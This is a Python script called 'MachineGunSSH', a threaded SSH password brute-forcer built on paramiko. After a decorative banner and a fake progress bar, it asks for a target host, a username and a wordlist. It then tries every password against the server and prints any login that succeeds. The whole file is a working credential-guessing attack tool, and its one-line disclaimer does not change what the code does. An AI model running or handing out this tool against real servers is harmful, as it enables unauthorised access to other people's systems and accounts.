import paramiko
import time
import sys
import threading
import os


def sysstart():
    banner = f"""
    ░░░░░░███████ ]▄▄▄▄▄▄▄▄
    ▂▄▅█████████▅▄▃▂
    I███████████████████].
    ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...                                                       
    """

    infobox = f"""
    ----------------------------------------
    |  ● MachineGunSSH by Tilman Steck ●  |
    |                                      |
    | version > 1.0                        |
    | donate > https://paypal.com/acc/     |
    |                                      |
    | IMPORTANT: Do not use this against   |
    | other people, just on yourself!      |
    |                                      |
    ----------------------------------------
    """

    print("[§] Connecting to database...\n")
    time.sleep(2)
    print(banner)
    print(infobox)
    time.sleep(0.5)
    print("\n[§] MachineGunSSH ist starting... \n")


    # setup toolbar
    toolbar_width = 30

    sys.stdout.write("[%s]" % (" " * toolbar_width))
    sys.stdout.flush()
    sys.stdout.write("\b" * (toolbar_width + 1))  # return to start of line, after '['

    for i in range(toolbar_width):
        time.sleep(0.2)
        sys.stdout.write("▬")
        sys.stdout.flush()

    sys.stdout.write("]\n\n")

    time.sleep(2)


def brute_force(ip, Username, Password):
    sshClient = paramiko.SSHClient()
    sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        sshClient.connect(ip, username=Username, password=Password)

    except paramiko.AuthenticationException:
        print("failed | " + Password)
        sshClient.close()

    else:
        print("\n\n[§] Brute-force attack is successfully")
        print("[§] Username: " + Username + " | Password: " + pword)
        sshClient.close()
        file.close()
        os._exit(1)

    sshClient.close()
    return


sysstart()

shost = input("[§] Brute-force attack host: ")
susername = input("[§] Brute-force attack Username: ")
swordlist = input("[§] Brute-force attack wordlist (passwd.txt): ")

print("\n\n[§] Connecting to HOST: " + shost)
print("[§] Brute-force attack is running now!\n")

file = open(swordlist, "r")

for line in file.readlines():
    pword = line.strip()

    t = threading.Thread(target=brute_force, args=(shost, susername, pword))
    t.start()
    time.sleep(0.3)


time.sleep(2)
print("\n\n[§] Brute-force is done now.")
file.close()


